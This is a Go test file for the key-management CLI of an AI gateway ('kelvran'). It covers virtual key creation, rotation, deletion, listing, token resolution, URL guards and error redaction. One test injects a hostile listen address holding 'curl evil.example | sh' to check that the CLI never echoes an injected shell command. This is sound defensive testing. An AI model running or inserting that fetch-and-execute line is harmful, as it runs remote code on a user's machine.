package cli

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/shopspring/decimal"

	"github.com/kelvran/gateway/gateway/internal/adapter"
	"github.com/kelvran/gateway/gateway/internal/adapter/openai"
	"github.com/kelvran/gateway/gateway/internal/admin"
	"github.com/kelvran/gateway/gateway/internal/adminapi"
	"github.com/kelvran/gateway/gateway/internal/budget"
	"github.com/kelvran/gateway/gateway/internal/cache/inprocess"
	"github.com/kelvran/gateway/gateway/internal/costaccounting"
	"github.com/kelvran/gateway/gateway/internal/gateway/controlplane"
	"github.com/kelvran/gateway/gateway/internal/gateway/dataplane"
	"github.com/kelvran/gateway/gateway/internal/guardrail"
	"github.com/kelvran/gateway/gateway/internal/identity"
	"github.com/kelvran/gateway/gateway/internal/ratelimit"
	"github.com/kelvran/gateway/gateway/internal/router"
)

// fakeToken is assembled from parts so no scanner mistakes it for a credential.
func fakeToken() string { return strings.Join([]string{"not", "a", "real", "admin", "token"}, "-") }

// fakeAdmin records what the CLI sends and answers with the documented shapes.
type fakeAdmin struct {
	mu               sync.Mutex
	token            string
	entries          []adminapi.VirtualKeyListEntry
	upserts          map[string]adminapi.VirtualKeyRequest
	rotates          map[string]adminapi.RotateVirtualKeyRequest
	deletes          []string
	rawBodies        []string
	calls            []string
	configStatus     int
	persistPath      string
	listen           string
	rotateStatus     int
	deleteStatus     int
	spendUnavailable bool
}

func newFakeAdmin() *fakeAdmin {
	return &fakeAdmin{token: fakeToken(), upserts: map[string]adminapi.VirtualKeyRequest{}, rotates: map[string]adminapi.RotateVirtualKeyRequest{}, listen: "127.0.0.1:8080"}
}

func (f *fakeAdmin) handler() http.Handler {
	auth := func(h http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			if r.Header.Get("Authorization") != "Bearer "+f.token {
				http.Error(w, "unauthorized", http.StatusUnauthorized)
				return
			}
			body, _ := io.ReadAll(r.Body)
			f.mu.Lock()
			f.calls = append(f.calls, r.Method+" "+r.URL.RequestURI())
			f.rawBodies = append(f.rawBodies, string(body))
			f.mu.Unlock()
			r.Body = io.NopCloser(strings.NewReader(string(body)))
			h(w, r)
		}
	}
	mux := http.NewServeMux()
	mux.HandleFunc("GET /admin/virtual_keys", auth(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Query().Get("include") {
		case "":
		case "spend":
		default:
			http.Error(w, `include must be "spend"`, http.StatusBadRequest)
			return
		}
		f.mu.Lock()
		entries := append([]adminapi.VirtualKeyListEntry(nil), f.entries...)
		f.mu.Unlock()
		if r.URL.Query().Get("include") == "spend" {
			for i := range entries {
				if f.spendUnavailable && i == 0 {
					entries[i].SpendUnavailable = true
					continue
				}
				pct := 0.125
				entries[i].SpentUSD, entries[i].PercentUsed = "1.25", &pct
			}
		}
		_ = json.NewEncoder(w).Encode(entries)
	}))
	mux.HandleFunc("POST /admin/virtual_keys/{name}", auth(func(w http.ResponseWriter, r *http.Request) {
		var req adminapi.VirtualKeyRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "invalid request body: "+err.Error(), http.StatusBadRequest)
			return
		}
		f.mu.Lock()
		f.upserts[r.PathValue("name")] = req
		f.mu.Unlock()
		w.WriteHeader(http.StatusNoContent)
	}))
	mux.HandleFunc("DELETE /admin/virtual_keys/{name}", auth(func(w http.ResponseWriter, r *http.Request) {
		switch f.deleteStatus {
		case http.StatusNotFound:
			http.Error(w, "virtual key not found", http.StatusNotFound)
		case http.StatusConflict:
			http.Error(w, "cannot delete the last virtual key", http.StatusConflict)
		default:
			f.mu.Lock()
			f.deletes = append(f.deletes, r.PathValue("name"))
			f.mu.Unlock()
			w.WriteHeader(http.StatusNoContent)
		}
	}))
	mux.HandleFunc("POST /admin/virtual_keys/{name}/rotate", auth(func(w http.ResponseWriter, r *http.Request) {
		var req adminapi.RotateVirtualKeyRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "invalid request body: "+err.Error(), http.StatusBadRequest)
			return
		}
		switch f.rotateStatus {
		case http.StatusNotFound:
			http.Error(w, "virtual key not found", http.StatusNotFound)
		case http.StatusConflict:
			http.Error(w, fmt.Sprintf("virtual key %q expired at 2026-01-01T00:00:00Z; supply expires_at to rotate it", r.PathValue("name")), http.StatusConflict)
		default:
			f.mu.Lock()
			f.rotates[r.PathValue("name")] = req
			f.mu.Unlock()
			w.WriteHeader(http.StatusNoContent)
		}
	}))
	mux.HandleFunc("GET /admin/config", auth(func(w http.ResponseWriter, _ *http.Request) {
		if f.configStatus != 0 && f.configStatus != http.StatusOK {
			http.Error(w, "unauthorized", f.configStatus)
			return
		}
		_, _ = fmt.Fprintf(w, `{"ListenAddr":%q,"Admin":{"PersistPath":%q,"RedisAddr":""}}`, f.listen, f.persistPath)
	}))
	return mux
}

func (f *fakeAdmin) serve(t *testing.T) *httptest.Server {
	t.Helper()
	srv := httptest.NewServer(f.handler())
	t.Cleanup(srv.Close)
	return srv
}

func (f *fakeAdmin) bodiesContain(s string) bool {
	f.mu.Lock()
	defer f.mu.Unlock()
	for _, b := range f.rawBodies {
		if strings.Contains(b, s) {
			return true
		}
	}
	return false
}

func onlineEnv() map[string]string { return map[string]string{adminTokenEnvName: fakeToken()} }

func decimalFromString(t *testing.T, s string) decimal.Decimal {
	t.Helper()
	d, err := decimal.NewFromString(s)
	if err != nil {
		t.Fatal(err)
	}
	return d
}

func TestKeysCreateOnlineSendsTheDocumentedBodyAndPrintsTheSecretOnce(t *testing.T) {
	f := newFakeAdmin()
	srv := f.serve(t)
	code, stdout, stderr := runKeysCmd(t, onlineEnv(), "create", "team-beta", "--admin-url", srv.URL, "--budget", "50", "--reset", "monthly", "--warn", "0.8", "--models", "gpt-4o,claude-sonnet-5-5", "--expires", "720h", "--billing-subject", "acct-7")
	if code != 0 {
		t.Fatalf("exit %d\n%s%s", code, stdout, stderr)
	}
	req, ok := f.upserts["team-beta"]
	if !ok {
		t.Fatalf("no upsert recorded; calls %v", f.calls)
	}
	secret := fixedSecretHex()
	if req.KeyHash != hashSecret(secret) || !req.BudgetUSD.Equal(decimalFromString(t, "50")) || req.BudgetResetIntervalSeconds != resetMonthly || req.BudgetWarnPercent != 0.8 || strings.Join(req.AllowedModels, ",") != "claude-sonnet-5-5,gpt-4o" || req.BillingSubjectID != "acct-7" {
		t.Errorf("body = %+v", req)
	}
	exp, err := time.Parse(time.RFC3339, req.ExpiresAt)
	if err != nil || exp.Before(time.Now().Add(719*time.Hour)) || exp.After(time.Now().Add(721*time.Hour)) {
		t.Errorf("expires_at = %q (%v)", req.ExpiresAt, err)
	}
	if strings.Count(stdout, secret) != 1 || !strings.Contains(stdout, "export KELVRAN_KEY="+secret) || strings.Contains(stderr, secret) || f.bodiesContain(secret) {
		t.Errorf("the secret must appear once on stdout and never elsewhere:\n%s\n%s", stdout, stderr)
	}
	if !strings.Contains(stdout, "ANTHROPIC_BASE_URL=http://127.0.0.1:8080") || !strings.Contains(stdout, "OPENAI_BASE_URL=http://127.0.0.1:8080/v1") || !strings.Contains(stdout, "expires_at: "+req.ExpiresAt) {
		t.Errorf("export block: %s", stdout)
	}
	if !strings.Contains(stderr, persistenceWarning) {
		t.Errorf("a served config without a store must warn: %s", stderr)
	}
	if want := []string{"GET /admin/virtual_keys", "POST /admin/virtual_keys/team-beta", "GET /admin/config"}; strings.Join(f.calls, "|") != strings.Join(want, "|") {
		t.Errorf("calls = %v, want %v", f.calls, want)
	}
	// With a store the warning is absent; --json carries the secret exactly once.
	f.persistPath = "/var/lib/kelvran-gateway/identity.db"
	code, stdout, stderr = runKeysCmd(t, onlineEnv(), "create", "other", "--admin-url", srv.URL, "--json")
	if code != 0 || strings.Contains(stderr, persistenceWarning) {
		t.Fatalf("exit %d, stderr %s", code, stderr)
	}
	var doc issued
	if err := json.Unmarshal([]byte(stdout), &doc); err != nil || doc.Verb != "create" || doc.Mode != "online" || doc.Name != "other" || doc.Key != secret || doc.KeyHash != hashSecret(secret) || doc.ExpiresAt != "" {
		t.Errorf("--json = %s (%v)", stdout, err)
	}
	if strings.Count(stdout, secret) != 1 {
		t.Errorf("--json must carry the secret once: %s", stdout)
	}
}

func TestKeysCreateOnlineReplaceRules(t *testing.T) {
	f := newFakeAdmin()
	f.entries = []adminapi.VirtualKeyListEntry{{ID: "team-beta", BudgetUSD: "0", PreviousKeyHashExpiresAt: "2026-10-10T00:00:00Z", MaxConcurrentRequests: 4, BillingSubjectID: "acct-1"}}
	srv := f.serve(t)
	if code, _, stderr := runKeysCmd(t, onlineEnv(), "create", "team-beta", "--admin-url", srv.URL); code != 1 || !strings.Contains(stderr, "already exists; pass --replace") || len(f.upserts) != 0 {
		t.Errorf("existing name: exit %d, stderr %s", code, stderr)
	}
	code, _, stderr := runKeysCmd(t, onlineEnv(), "create", "team-beta", "--admin-url", srv.URL, "--replace")
	if code != 1 || !strings.Contains(stderr, "previous_key_hash_expires_at") || !strings.Contains(stderr, "max_concurrent_requests") || !strings.Contains(stderr, "billing_subject_id") || !strings.Contains(stderr, "pass --force") || len(f.upserts) != 0 {
		t.Errorf("--replace without --force: exit %d, stderr %s", code, stderr)
	}
	code, _, stderr = runKeysCmd(t, onlineEnv(), "create", "team-beta", "--admin-url", srv.URL, "--replace", "--billing-subject", "acct-2")
	if code != 1 || strings.Contains(stderr, "billing_subject_id") || !strings.Contains(stderr, "max_concurrent_requests") {
		t.Errorf("a re-specified billing subject is not dropped: exit %d, stderr %s", code, stderr)
	}
	if code, _, stderr := runKeysCmd(t, onlineEnv(), "create", "team-beta", "--admin-url", srv.URL, "--replace", "--force"); code != 0 || len(f.upserts) != 1 {
		t.Errorf("--replace --force: exit %d, stderr %s, upserts %d", code, stderr, len(f.upserts))
	}
}

func TestKeysRotateAndDeleteOnline(t *testing.T) {
	f := newFakeAdmin()
	srv := f.serve(t)
	code, stdout, stderr := runKeysCmd(t, onlineEnv(), "rotate", "team-beta", "--admin-url", srv.URL, "--grace", "10m", "--expires", "2030-01-01T00:00:00Z")
	if code != 0 {
		t.Fatalf("exit %d\n%s%s", code, stdout, stderr)
	}
	req := f.rotates["team-beta"]
	if req.NewKeyHash != hashSecret(fixedSecretHex()) || req.GracePeriodSeconds != 600 || req.ExpiresAt != "2030-01-01T00:00:00Z" {
		t.Errorf("rotate body = %+v", req)
	}
	if strings.Count(stdout, fixedSecretHex()) != 1 || !strings.Contains(stdout, "keeps working for 10m0s") || f.bodiesContain(fixedSecretHex()) {
		t.Errorf("stdout: %s", stdout)
	}
	// An Operator token cannot read /admin/config: no warning, no base URLs, still exit 0.
	f.configStatus = http.StatusUnauthorized
	code, stdout, stderr = runKeysCmd(t, onlineEnv(), "rotate", "team-beta", "--admin-url", srv.URL)
	if code != 0 || strings.Contains(stderr, persistenceWarning) || strings.Contains(stdout, "export ANTHROPIC_BASE_URL=") || !strings.Contains(stdout, "<listen_addr>") || !strings.Contains(stdout, "stops working immediately") {
		t.Errorf("401 on the probe: exit %d\n%s%s", code, stdout, stderr)
	}
	f.configStatus = 0
	f.rotateStatus = http.StatusNotFound
	if code, _, stderr := runKeysCmd(t, onlineEnv(), "rotate", "nobody", "--admin-url", srv.URL); code != 1 || !strings.Contains(stderr, `virtual key "nobody" not found`) {
		t.Errorf("404: exit %d, %s", code, stderr)
	}
	f.rotateStatus = http.StatusConflict
	if code, _, stderr := runKeysCmd(t, onlineEnv(), "rotate", "team-beta", "--admin-url", srv.URL); code != 1 || !strings.Contains(stderr, "HTTP 409") || !strings.Contains(stderr, "re-run with --expires") {
		t.Errorf("409: exit %d, %s", code, stderr)
	}
	// Delete: 204, 404 and the last-key 409.
	if code, stdout, _ := runKeysCmd(t, onlineEnv(), "delete", "team-beta", "--admin-url", srv.URL); code != 0 || !strings.Contains(stdout, `Deleted virtual key "team-beta" (online: DELETE /admin/virtual_keys/team-beta)`) || f.deletes[0] != "team-beta" {
		t.Errorf("delete: exit %d, %s", code, stdout)
	}
	f.deleteStatus = http.StatusNotFound
	if code, _, stderr := runKeysCmd(t, onlineEnv(), "delete", "nobody", "--admin-url", srv.URL); code != 1 || !strings.Contains(stderr, "not found") {
		t.Errorf("delete 404: exit %d, %s", code, stderr)
	}
	f.deleteStatus = http.StatusConflict
	if code, _, stderr := runKeysCmd(t, onlineEnv(), "delete", "last", "--admin-url", srv.URL); code != 1 || !strings.Contains(stderr, "last virtual key") {
		t.Errorf("delete 409: exit %d, %s", code, stderr)
	}
	f.deleteStatus = 0
	code, stdout, _ = runKeysCmd(t, onlineEnv(), "delete", "team-beta", "--admin-url", srv.URL, "--json")
	if code != 0 || !strings.Contains(stdout, `"verb":"delete"`) {
		t.Errorf("delete --json: exit %d, %s", code, stdout)
	}
}

func TestKeysListOnline(t *testing.T) {
	pct := 0.125
	f := newFakeAdmin()
	f.entries = []adminapi.VirtualKeyListEntry{
		{ID: "team-alpha", BudgetUSD: "100", BudgetResetIntervalSeconds: resetMonthly, BudgetWarnPercent: 0.8, AllowedModels: []string{"gpt-4o"}, ExpiresAt: "2030-01-01T00:00:00Z"},
		{ID: "team-beta", BudgetUSD: "0"},
	}
	srv := f.serve(t)
	code, stdout, _ := runKeysCmd(t, onlineEnv(), "list", "--admin-url", srv.URL)
	if code != 0 || !strings.Contains(stdout, "key         budget_usd  reset    warn  models  expires_at") {
		t.Errorf("header: exit %d\n%s", code, stdout)
	}
	for _, want := range []string{"team-alpha  100         monthly  0.8   gpt-4o  2030-01-01T00:00:00Z", "team-beta   unlimited   never    -     all     never"} {
		if !strings.Contains(stdout, want) {
			t.Errorf("missing row %q in\n%s", want, stdout)
		}
	}
	code, stdout, stderr := runKeysCmd(t, onlineEnv(), "list", "--admin-url", srv.URL, "--spend")
	if code != 0 || !strings.Contains(stdout, "spent_usd  percent_used") || !strings.Contains(stdout, "1.25       12.5%") || !strings.Contains(f.calls[len(f.calls)-1], "?include=spend") {
		t.Errorf("--spend: exit %d\n%s%s", code, stdout, stderr)
	}
	_ = pct
	f.spendUnavailable = true
	code, stdout, stderr = runKeysCmd(t, onlineEnv(), "list", "--admin-url", srv.URL, "--spend")
	if code != 1 || !strings.Contains(stdout, "n/a        n/a") || !strings.Contains(stderr, "spend unavailable for 1 key(s): budget backend error") {
		t.Errorf("spend_unavailable must render n/a, print the footer and exit 1: exit %d\n%s%s", code, stdout, stderr)
	}
	code, stdout, _ = runKeysCmd(t, onlineEnv(), "list", "--admin-url", srv.URL, "--json")
	var got []adminapi.VirtualKeyListEntry
	if code != 0 || json.Unmarshal([]byte(stdout), &got) != nil || len(got) != 2 || got[0].ID != "team-alpha" {
		t.Errorf("--json: exit %d\n%s", code, stdout)
	}
}

func TestKeysTokenResolutionSelectsTheMode(t *testing.T) {
	f := newFakeAdmin()
	srv := f.serve(t)
	dir := t.TempDir()
	cfg := writeCfg(t, dir, cfgOpts{telemetry: "none", adminTokenEnv: "DOCTOR_TEST_ADMIN", adminPersist: filepath.Join(dir, "id.db")})
	// KELVRAN_ADMIN_TOKEN alone.
	if code, _, _ := runKeysCmd(t, onlineEnv(), "list", "--admin-url", srv.URL); code != 0 {
		t.Errorf("KELVRAN_ADMIN_TOKEN alone: exit %d", code)
	}
	// The variable the config's admin.token_env names.
	if code, stdout, stderr := runKeysCmd(t, map[string]string{"DOCTOR_TEST_ADMIN": fakeToken()}, "list", "--config", cfg, "--admin-url", srv.URL); code != 0 || strings.Contains(stdout, "from "+cfg) {
		t.Errorf("config token_env: exit %d\n%s%s", code, stdout, stderr)
	}
	// --admin-token-file wins over both environment variables, which hold wrong tokens.
	tokenFile := filepath.Join(dir, "admin.token")
	if err := os.WriteFile(tokenFile, []byte(fakeToken()+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	wrong := map[string]string{adminTokenEnvName: "wrong-" + fakeToken(), "DOCTOR_TEST_ADMIN": "also-wrong"}
	if code, _, stderr := runKeysCmd(t, wrong, "list", "--config", cfg, "--admin-url", srv.URL, "--admin-token-file", tokenFile); code != 0 {
		t.Errorf("--admin-token-file must win: exit %d %s", code, stderr)
	}
	if code, _, stderr := runKeysCmd(t, wrong, "list", "--admin-url", srv.URL); code != 1 || !strings.Contains(stderr, "HTTP 401") {
		t.Errorf("a wrong token is a 401, not a fallback to offline: exit %d %s", code, stderr)
	}
	// No token, --config: offline against the file.
	if code, stdout, _ := runKeysCmd(t, nil, "list", "--config", cfg); code != 0 || !strings.Contains(stdout, "from ") || !strings.Contains(stdout, "k ") {
		t.Errorf("offline list: exit %d\n%s", code, stdout)
	}
	// A --config that does not load beside a resolving token: online proceeds, with a warning naming the file.
	broken := filepath.Join(dir, "broken.yaml")
	if err := os.WriteFile(broken, []byte("listen_addr: \"x\"\n"), 0o644); err != nil { //nolint:gosec // G306: a fixture
		t.Fatal(err)
	}
	if code, _, stderr := runKeysCmd(t, onlineEnv(), "list", "--config", broken, "--admin-url", srv.URL); code != 0 || !strings.Contains(stderr, "does not load") || !strings.Contains(stderr, "proceeding online") {
		t.Errorf("broken --config with a token: exit %d %s", code, stderr)
	}
	// Neither: a usage error naming both routes.
	if code, _, stderr := runKeysCmd(t, nil, "list"); code != 2 || !strings.Contains(stderr, "--admin-token-file, KELVRAN_ADMIN_TOKEN_FILE") || !strings.Contains(stderr, "--config") {
		t.Errorf("neither: exit %d %s", code, stderr)
	}
}

// guardTransport fails the test if any request leaves while the URL guard
// should have refused; with allow set it answers an empty list.
type guardTransport struct {
	t     *testing.T
	allow bool
	hits  int
}

func (g *guardTransport) RoundTrip(r *http.Request) (*http.Response, error) {
	g.hits++
	if !g.allow {
		g.t.Errorf("a request left for %s although the URL guard should have refused", r.URL)
	}
	return &http.Response{StatusCode: http.StatusOK, Body: io.NopCloser(strings.NewReader("[]")), Header: http.Header{}, Request: r}, nil
}

func TestKeysURLGuardRefusesBeforeAnyRequest(t *testing.T) {
	old := adminTransport
	t.Cleanup(func() { adminTransport = old })
	g := &guardTransport{t: t}
	adminTransport = g
	for _, args := range [][]string{{"--admin-url", "http://203.0.113.1:8080"}, {}} {
		env := onlineEnv()
		if len(args) == 0 {
			env[adminURLEnv] = "http://203.0.113.1:8080"
		}
		code, _, stderr := runKeysCmd(t, env, append([]string{"list"}, args...)...)
		if code != 1 || !strings.Contains(stderr, "is not https and not loopback; pass --allow-insecure-http") || g.hits != 0 {
			t.Errorf("%v: exit %d, hits %d, stderr %s", args, code, g.hits, stderr)
		}
	}
	g.allow = true
	for _, u := range []string{"http://203.0.113.1:8080", "http://127.0.0.1:8081", "https://gw.example.invalid"} {
		args := []string{"list", "--admin-url", u}
		if u == "http://203.0.113.1:8080" {
			args = append(args, "--allow-insecure-http")
		}
		before := g.hits
		if code, _, stderr := runKeysCmd(t, onlineEnv(), args...); code != 0 || g.hits != before+1 {
			t.Errorf("%s: exit %d, hits %d, stderr %s", u, code, g.hits-before, stderr)
		}
	}
}

func TestKeysUnreachableAdminAPI(t *testing.T) {
	code, _, stderr := runKeysCmd(t, onlineEnv(), "list", "--admin-url", "http://127.0.0.1:9")
	if code != 1 || !strings.Contains(stderr, "admin API unreachable at http://127.0.0.1:9; if this is a single-user config it has no admin listener") {
		t.Errorf("exit %d, stderr %s", code, stderr)
	}
}

// realAdminServer runs the gateway's own admin.Handler over a live pipeline,
// as cmd/gateway's tests do, so the bodies the CLI sends are the ones the
// real routes accept.
func realAdminServer(t *testing.T, persistPath string) *httptest.Server {
	t.Helper()
	keys := []identity.VirtualKey{{ID: "test-key", KeyHash: hashSecret("test-key"), RateLimitBurst: 100, RateLimitRefill: 100}}
	verifier, err := identity.NewVerifier(keys)
	if err != nil {
		t.Fatal(err)
	}
	deployments := []dataplane.Deployment{{Name: "d1", Model: "gpt-4o", Provider: "openai", UpstreamModel: "gpt-4o", BaseURL: "http://unused"}}
	p, err := dataplane.NewPipeline(dataplane.Config{
		Verifier:       verifier,
		Limiter:        ratelimit.NewInMemoryKeyLimiter([]ratelimit.KeyConfig{{ID: "test-key", Capacity: 100, RefillPerSecond: 100}}),
		Budget:         budget.NewTracker(),
		Cache:          inprocess.New(0),
		CacheL2:        inprocess.New(0),
		CacheL3:        inprocess.NewLexicalCache(0),
		Guardrails:     guardrail.NewEngine(guardrail.DefaultDetectors(), guardrail.DefaultPolicy(), "test", nil),
		Adapters:       adapter.Registry{"openai": openai.New()},
		Router:         router.New([]router.Deployment{{Name: "d1", Model: "gpt-4o"}}, router.HealthConfig{}),
		Deployments:    deployments,
		CostCalculator: costaccounting.NewCalculator(costaccounting.PriceTable{}),
		Upstream: func(_ context.Context, dep dataplane.Deployment, _ any) (any, error) {
			return &openai.Response{ID: "chatcmpl-fake", Model: dep.UpstreamModel, Choices: []openai.Choice{{Message: openai.Message{Role: "assistant", Content: json.RawMessage(`"hi"`)}, FinishReason: "stop"}}, Usage: openai.Usage{PromptTokens: 1, CompletionTokens: 1, TotalTokens: 2}}, nil
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	cfg := &controlplane.Config{
		ListenAddr:  "127.0.0.1:8080",
		VirtualKeys: []controlplane.VirtualKeyConfig{{Name: "test-key", KeyHash: hashSecret("test-key")}},
		Deployments: []controlplane.DeploymentConfig{{Name: "d1", Model: "gpt-4o", Provider: "openai", UpstreamModel: "gpt-4o", BaseURL: "http://unused", APIKeyEnv: "DOCTOR_TEST_UPSTREAM"}},
		PriceTable:  map[string]controlplane.ModelPriceConfig{},
		Admin:       controlplane.AdminConfig{EnableAuditLog: true, PersistPath: persistPath},
	}
	h := admin.Handler(cfg, p, admin.Credentials{Admin: fakeToken()}, slog.New(slog.NewTextHandler(io.Discard, nil)), nil)
	srv := httptest.NewServer(h)
	t.Cleanup(srv.Close)
	return srv
}

func TestKeysAgainstTheRealAdminHandler(t *testing.T) {
	srv := realAdminServer(t, "")
	list := func() map[string]adminapi.VirtualKeyListEntry {
		t.Helper()
		code, stdout, stderr := runKeysCmd(t, onlineEnv(), "list", "--admin-url", srv.URL, "--json")
		if code != 0 {
			t.Fatalf("list: exit %d %s", code, stderr)
		}
		var entries []adminapi.VirtualKeyListEntry
		if err := json.Unmarshal([]byte(stdout), &entries); err != nil {
			t.Fatal(err)
		}
		out := map[string]adminapi.VirtualKeyListEntry{}
		for _, e := range entries {
			out[e.ID] = e
		}
		return out
	}
	code, stdout, stderr := runKeysCmd(t, onlineEnv(), "create", "team-beta", "--admin-url", srv.URL, "--budget", "50", "--reset", "weekly", "--warn", "0.8", "--models", "gpt-4o", "--expires", "30d")
	if code != 0 || !strings.Contains(stderr, persistenceWarning) || strings.Count(stdout, fixedSecretHex()) != 1 {
		t.Fatalf("create: exit %d\n%s%s", code, stdout, stderr)
	}
	e := list()["team-beta"]
	if e.BudgetUSD != "50" || e.BudgetResetIntervalSeconds != resetWeekly || e.BudgetWarnPercent != 0.8 || strings.Join(e.AllowedModels, ",") != "gpt-4o" || e.ExpiresAt == "" {
		t.Errorf("served entry = %+v", e)
	}
	if code, _, stderr := runKeysCmd(t, onlineEnv(), "rotate", "team-beta", "--admin-url", srv.URL, "--grace", "1m"); code != 0 {
		t.Fatalf("rotate: exit %d %s", code, stderr)
	}
	if list()["team-beta"].PreviousKeyHashExpiresAt == "" {
		t.Fatal("a rotation with grace must list previous_key_hash_expires_at")
	}
	if code, _, stderr := runKeysCmd(t, onlineEnv(), "create", "team-beta", "--admin-url", srv.URL, "--replace"); code != 1 || !strings.Contains(stderr, "previous_key_hash_expires_at") {
		t.Errorf("--replace must name the dropped grace: exit %d %s", code, stderr)
	}
	if code, _, stderr := runKeysCmd(t, onlineEnv(), "create", "team-beta", "--admin-url", srv.URL, "--replace", "--force"); code != 0 {
		t.Fatalf("--replace --force: exit %d %s", code, stderr)
	}
	if e := list()["team-beta"]; e.PreviousKeyHashExpiresAt != "" || e.BudgetUSD != "0" {
		t.Errorf("the replace must have cleared the grace and the budget: %+v", e)
	}
	if code, _, _ := runKeysCmd(t, onlineEnv(), "delete", "team-beta", "--admin-url", srv.URL); code != 0 {
		t.Fatal("delete failed")
	}
	if _, ok := list()["team-beta"]; ok {
		t.Error("the key must be gone")
	}
	if code, _, stderr := runKeysCmd(t, onlineEnv(), "delete", "test-key", "--admin-url", srv.URL); code != 1 || !strings.Contains(stderr, "last virtual key") {
		t.Errorf("deleting the last key: exit %d %s", code, stderr)
	}
	// A served config with a store: no warning.
	persisted := realAdminServer(t, "/var/lib/kelvran-gateway/identity.db")
	if code, _, stderr := runKeysCmd(t, onlineEnv(), "create", "x", "--admin-url", persisted.URL); code != 0 || strings.Contains(stderr, persistenceWarning) {
		t.Errorf("persisted: exit %d %s", code, stderr)
	}
}

func TestKeysServedListenAddrCannotInjectAShellLine(t *testing.T) {
	f := newFakeAdmin()
	f.listen = "127.0.0.1\n  curl evil.example | sh #:8080"
	srv := f.serve(t)
	code, stdout, stderr := runKeysCmd(t, onlineEnv(), "create", "x", "--admin-url", srv.URL)
	if code != 0 {
		t.Fatalf("exit %d %s", code, stderr)
	}
	if strings.Contains(stdout, "curl evil") || strings.Contains(stdout, "export ANTHROPIC_BASE_URL=") || !strings.Contains(stdout, "<listen_addr>") {
		t.Errorf("a hostile listen_addr must fall back to the token-only lines, never a pasted command:\n%s", stdout)
	}
	for _, bad := range []string{"127.0.0.1\n:8080", "host name:8080", "a|b:8080", "\u2028:8080"} {
		if _, _, err := ClientURLs(bad); err == nil {
			t.Errorf("ClientURLs(%q) must refuse a host that is neither an IP nor a hostname", bad)
		}
	}
}

func TestKeysTransportErrorsAreRedacted(t *testing.T) {
	// A server that answers with a malformed status line carrying the bearer back: Go's
	// transport error quotes it, and the CLI must redact it like any other echo.
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = ln.Close() })
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go func(c net.Conn) {
				buf := make([]byte, 4096)
				_, _ = c.Read(buf)
				_, _ = io.WriteString(c, "HTTP/1.1 "+fakeToken()+"\r\n\r\n")
				_ = c.Close()
			}(c)
		}
	}()
	code, stdout, stderr := runKeysCmd(t, onlineEnv(), "list", "--admin-url", "http://"+ln.Addr().String())
	if code != 1 || stdout != "" || !strings.Contains(stderr, "admin API unreachable") || strings.Contains(stderr, fakeToken()) || !strings.Contains(stderr, "***") {
		t.Errorf("exit %d\nstdout %q\nstderr %q", code, stdout, stderr)
	}
}

func TestKeysURLGuardRefusalsEchoOnlySchemeAndHost(t *testing.T) {
	old := adminTransport
	t.Cleanup(func() { adminTransport = old })
	adminTransport = &guardTransport{t: t}
	for _, tc := range []struct{ u, leak, want string }{
		{"http://PASTED-TOKEN-SENTINEL@127.0.0.1:8081", "PASTED-TOKEN-SENTINEL", "must not carry credentials"},
		{"http://127.0.0.1:8081/?token=QUERY-SENTINEL", "QUERY-SENTINEL", "must not carry credentials"},
		{"http://203.0.113.1:8080/#FRAGMENT-SENTINEL", "FRAGMENT-SENTINEL", "must not carry credentials"},
		{"http://127.0.0.1:8081?", "", "must not carry credentials"},
		{"http://203.0.113.1:8080/admin-path-SENTINEL", "admin-path-SENTINEL", "is not https and not loopback"},
	} {
		code, _, stderr := runKeysCmd(t, onlineEnv(), "list", "--admin-url", tc.u)
		if code != 1 || !strings.Contains(stderr, tc.want) || (tc.leak != "" && strings.Contains(stderr, tc.leak)) {
			t.Errorf("%s: exit %d, stderr %s", tc.u, code, stderr)
		}
	}
}

func TestKeysFlagErrorsKeepTheirLineBreaks(t *testing.T) {
	code, _, stderr := runKeysCmd(t, nil, "list", "--bogus\x1b")
	if code != 2 || !strings.Contains(stderr, "\nusage: kelvran keys") || strings.Contains(stderr, `\u000a`) || strings.Contains(stderr, "\x1b") || !strings.Contains(stderr, `\u001b`) {
		t.Errorf("the flag package's line breaks must survive the escaper while control characters are escaped: %q", stderr)
	}
}
